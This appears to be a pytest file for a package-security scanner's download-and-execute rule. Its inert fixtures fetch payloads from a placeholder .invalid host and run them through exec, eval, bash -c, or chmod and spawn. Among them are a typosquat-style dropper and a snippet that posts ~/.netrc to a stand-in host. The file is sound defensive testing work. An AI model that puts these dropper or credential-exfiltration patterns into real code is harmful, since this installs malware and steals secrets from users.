"""remote-code.download-exec: a network fetch whose bytes are executed, or written to disk and then run, loaded or
made executable (Python and JS/TS). Package metadata (PKG-INFO, METADATA, *.dist-info/*, *.egg-info/*) is prose.

Every fixture here is inert: canary hosts under .invalid, nothing is ever run.
"""
from __future__ import annotations

import pytest

from bawwab.scan.files import ScanFile
from bawwab.scan.rules import CATALOG, run_static_rules
from bawwab.severity import compute_verdict
from bawwab.types import Severity, Verdict

RULE = "remote-code.download-exec"
U = "https://BAWWAB-CANARY.dropper.invalid"


def hits(rel: str, src: str):
    return [(f.severity, f.line) for f in run_static_rules([ScanFile(rel, src)]) if f.rule == RULE]


def sev(rel: str, src: str):
    return {s for s, _ in hits(rel, src)}


def test_rule_in_catalog():
    assert RULE in CATALOG


# ---------------------------------------------------------------- Python, CRITICAL

GEQUESTS_SHAPE = f"""import requests
import platform
import os

def execute():
    operating_system = platform.system().lower()
    names = []
    req = requests.get('{U}/all.txt')
    for line in req.text.splitlines():
        if operating_system in line:
            names.append(line.strip())
    for executable in names:
        req = requests.get(f'{U}/{{executable}}')
        with open(executable, 'wb') as f:
            f.write(req.content)
        os.system(f'chmod +x {{executable}}')
        os.system(f'./{{executable}} &')
"""


def test_py_download_chmod_run_is_critical():
    got = hits("pkg/frequest.py", GEQUESTS_SHAPE)
    assert got and {s for s, _ in got} == {Severity.CRITICAL}
    assert {ln for _, ln in got} <= {16, 17}


def test_py_exec_of_response_is_critical():
    src = f"import urllib.request\nexec(urllib.request.urlopen('{U}/s.py').read())\n"
    assert sev("a.py", src) == {Severity.CRITICAL}


def test_py_exec_through_variables_and_helper():
    src = (
        "import requests, base64\n"
        "def fetch(u):\n"
        "    r = requests.get(u)\n"
        "    return r.text\n"
        "def boot():\n"
        f"    code = fetch('{U}/x')\n"
        "    blob = base64.b64decode(code)\n"
        "    exec(compile(blob, 'x', 'exec'))\n"
    )
    assert sev("a.py", src) == {Severity.CRITICAL}


def test_py_urlretrieve_then_popen():
    src = (
        "import subprocess, tempfile, os\n"
        "from urllib.request import urlretrieve\n"
        "dest = os.path.join(tempfile.gettempdir(), 'upd.exe')\n"
        f"urlretrieve('{U}/upd.exe', dest)\n"
        "subprocess.Popen([dest, '--silent'])\n"
    )
    assert sev("a.py", src) == {Severity.CRITICAL}


def test_py_write_bytes_then_chmod():
    src = (
        "import os, httpx\n"
        "from pathlib import Path\n"
        "p = Path.home() / '.cache' / 'agentd'\n"
        f"p.write_bytes(httpx.get('{U}/agentd').content)\n"
        "os.chmod(p, 0o755)\n"
    )
    assert sev("a.py", src) == {Severity.CRITICAL}


def test_py_downloaded_library_loaded():
    src = (
        "import ctypes, requests\n"
        f"data = requests.get('{U}/lib.so').content\n"
        "open('/tmp/libx.so', 'wb').write(data)\n"
        "ctypes.CDLL('/tmp/libx.so')\n"
    )
    assert sev("a.py", src) == {Severity.CRITICAL}


def test_py_payload_into_shell_c():
    src = (
        "import subprocess, requests\n"
        f"cmd = requests.get('{U}/c').text\n"
        "subprocess.run(['bash', '-c', cmd])\n"
    )
    assert sev("a.py", src) == {Severity.CRITICAL}


def test_py_payload_as_whole_command():
    src = f"import os, requests\nos.system(requests.get('{U}/c').text)\n"
    assert sev("a.py", src) == {Severity.CRITICAL}


# ---------------------------------------------------------------- JS / TS, CRITICAL

def test_js_fetch_text_eval():
    src = f"async function boot() {{\n  const r = await fetch('{U}/p.js');\n  eval(await r.text());\n}}\nboot();\n"
    assert sev("index.js", src) == {Severity.CRITICAL}


def test_js_https_get_callback_accumulates_then_evals():
    src = (
        "const https = require('https');\n"
        f"https.get('{U}/p', res => {{\n"
        "  let body = '';\n"
        "  res.on('data', d => { body += d; });\n"
        "  res.on('end', () => { new Function(body)(); });\n"
        "});\n"
    )
    assert sev("index.js", src) == {Severity.CRITICAL}


def test_js_then_chain_into_eval_reference():
    src = f"fetch('{U}/p').then(r => r.text()).then(eval);\n"
    assert sev("index.js", src) == {Severity.CRITICAL}


def test_js_pipe_to_file_then_execfile():
    src = (
        "const https = require('https');\n"
        "const fs = require('fs');\n"
        "const { execFile } = require('child_process');\n"
        "const bin = require('path').join(require('os').tmpdir(), 'helper');\n"
        f"https.get('{U}/helper', res => {{\n"
        "  const out = fs.createWriteStream(bin);\n"
        "  res.pipe(out);\n"
        "  out.on('finish', () => execFile(bin));\n"
        "});\n"
    )
    assert sev("install.js", src) == {Severity.CRITICAL}


def test_ts_axios_write_chmod_spawn():
    src = (
        "import axios from 'axios';\n"
        "import * as fs from 'fs';\n"
        "import { spawn } from 'node:child_process';\n"
        "export async function start(dir: string) {\n"
        "  const target = `${dir}/agent-bin`;\n"
        f"  const r = await axios.get('{U}/bin', {{ responseType: 'arraybuffer' }});\n"
        "  fs.writeFileSync(target, Buffer.from(r.data));\n"
        "  fs.chmodSync(target, 0o755);\n"
        "  spawn(target, ['--daemon'], { detached: true });\n"
        "}\n"
    )
    assert sev("src/start.ts", src) == {Severity.CRITICAL}


def test_js_child_process_exec_of_payload():
    src = (
        "const cp = require('child_process');\n"
        f"fetch('{U}/cmd').then(r => r.text()).then(cmd => cp.exec(cmd));\n"
    )
    assert sev("index.js", src) == {Severity.CRITICAL}


# ---------------------------------------------------------------- checksum-verified installers: HIGH

def test_py_pinned_sha256_installer_is_high():
    src = (
        "import hashlib, os, subprocess, requests\n"
        "SHA256 = 'a' * 64\n"
        "def install(dest):\n"
        f"    data = requests.get('{U}/tool-1.2.3').content\n"
        "    if hashlib.sha256(data).hexdigest() != SHA256:\n"
        "        raise RuntimeError('checksum mismatch')\n"
        "    with open(dest, 'wb') as f:\n"
        "        f.write(data)\n"
        "    os.chmod(dest, 0o755)\n"
        "    subprocess.run([dest, '--version'], check=True)\n"
    )
    assert sev("install.py", src) == {Severity.HIGH}


def test_js_sha256_verified_installer_is_high():
    src = (
        "const crypto = require('crypto');\n"
        "const fs = require('fs');\n"
        "const { spawnSync } = require('child_process');\n"
        "const EXPECTED = 'b'.repeat(64);\n"
        "async function install(dest) {\n"
        f"  const buf = Buffer.from(await (await fetch('{U}/tool')).arrayBuffer());\n"
        "  const got = crypto.createHash('sha256').update(buf).digest('hex');\n"
        "  if (got !== EXPECTED) throw new Error('checksum mismatch');\n"
        "  fs.writeFileSync(dest, buf);\n"
        "  fs.chmodSync(dest, 0o755);\n"
        "  spawnSync(dest, ['--version']);\n"
        "}\n"
    )
    assert sev("install.js", src) == {Severity.HIGH}


# ---------------------------------------------------------------- not this rule

@pytest.mark.parametrize("rel,src", [
    ("a.py", f"import requests\nr = requests.get('{U}/f.csv')\nopen('f.csv', 'wb').write(r.content)\n"),
    ("a.py", (
        "import subprocess, requests\n"
        f"r = requests.get('{U}/a.tgz')\n"
        "open('a.tgz', 'wb').write(r.content)\n"
        "subprocess.run(['tar', 'xzf', 'a.tgz'])\n"
    )),
    ("a.py", (
        "import subprocess, requests\n"
        f"tag = requests.get('{U}/latest').json()['tag']\n"
        "subprocess.run(['pip', 'install', f'tool=={tag}'])\n"
        "subprocess.run(['git', 'checkout', tag])\n"
    )),
    ("a.py", (
        "import os, platform, requests\n"
        "name = platform.system()\n"
        f"requests.post('{U}/ping', json={{'os': name}})\n"
        "os.system('echo done')\n"
    )),
    ("a.py", (
        "import subprocess, requests\n"
        f"name = requests.get('{U}/repo').json()['name']\n"
        "subprocess.run(['bash', '-c', f'cd {name} && make'])\n"
    )),
    ("a.py", (
        "import subprocess, requests\n"
        "class C:\n"
        "    def load(self):\n"
        f"        self.cfg = requests.get('{U}/c').json()\n"
        "        self.tool = 'git'\n"
        "        subprocess.run([self.tool, 'status'])\n"
    )),
    ("a.py", (
        "import subprocess, requests\n"
        f"r = requests.get('{U}/out')\n"
        "open('/tmp/cache/out', 'wb').write(r.content)\n"
        "subprocess.run(['ls', '/tmp/cache'])\n"
        "subprocess.run(['xdg-open', '/tmp/cache/out'])\n"
    )),
    ("a.js", (
        "const RE = /token=(\\w+)/;\n"
        f"fetch('{U}/x').then(r => r.text()).then(t => RE.exec(t));\n"
    )),
    ("a.js", (
        "const { spawn } = require('child_process');\n"
        f"const cfg = await (await fetch('{U}/cfg')).json();\n"
        "console.log(JSON.parse(JSON.stringify(cfg)));\n"
        "spawn('git', ['status']);\n"
    )),
    ("a.js", (
        "const fs = require('fs');\n"
        f"const r = await fetch('{U}/data.json');\n"
        "fs.writeFileSync('data.json', await r.text());\n"
        "const data = JSON.parse(fs.readFileSync('data.json', 'utf8'));\n"
    )),
])
def test_not_download_exec(rel, src):
    assert hits(rel, src) == []


# ---------------------------------------------------------------- package metadata is prose

PKG_INFO = """Metadata-Version: 2.1
Name: example
Version: 2.28.1
Summary: Python HTTP for Humans.

Requests
========

    >>> import requests
    >>> r = requests.get('https://httpbin.org/basic-auth/user/pass', auth=('user', 'pass'))
    >>> r.status_code
    200

- Keep-Alive & Connection Pooling
- Automatic honoring of `.netrc`
- Basic & Digest Authentication
"""


@pytest.mark.parametrize("rel", ["PKG-INFO", "example.egg-info/PKG-INFO", "example-2.28.1.dist-info/METADATA",
                                 "example.egg-info/SOURCES.txt"])
def test_package_metadata_is_not_code(rel):
    found = run_static_rules([ScanFile(rel, PKG_INFO)])
    assert {f.rule for f in found} & {"exfil.combo", "credential-access", "exfil.host"} == set()


def test_code_inside_metadata_dir_is_still_code():
    src = "import requests\nk = open('/home/u/.netrc').read()\nrequests.post('https://x.invalid', data=k)\n"
    found = run_static_rules([ScanFile("example.egg-info/hook.py", src)])
    assert any(f.rule == "exfil.combo" and f.severity == Severity.CRITICAL for f in found)


def test_dropper_package_is_malicious_for_the_right_reason():
    files = [ScanFile("PKG-INFO", PKG_INFO), ScanFile("gequests/frequest.py", GEQUESTS_SHAPE),
             ScanFile("gequests/__init__.py", "from .frequest import *\n")]
    found = run_static_rules(files)
    crit = {f.rule for f in found if f.severity == Severity.CRITICAL}
    assert crit == {RULE}
    assert compute_verdict(found) == Verdict.MALICIOUS
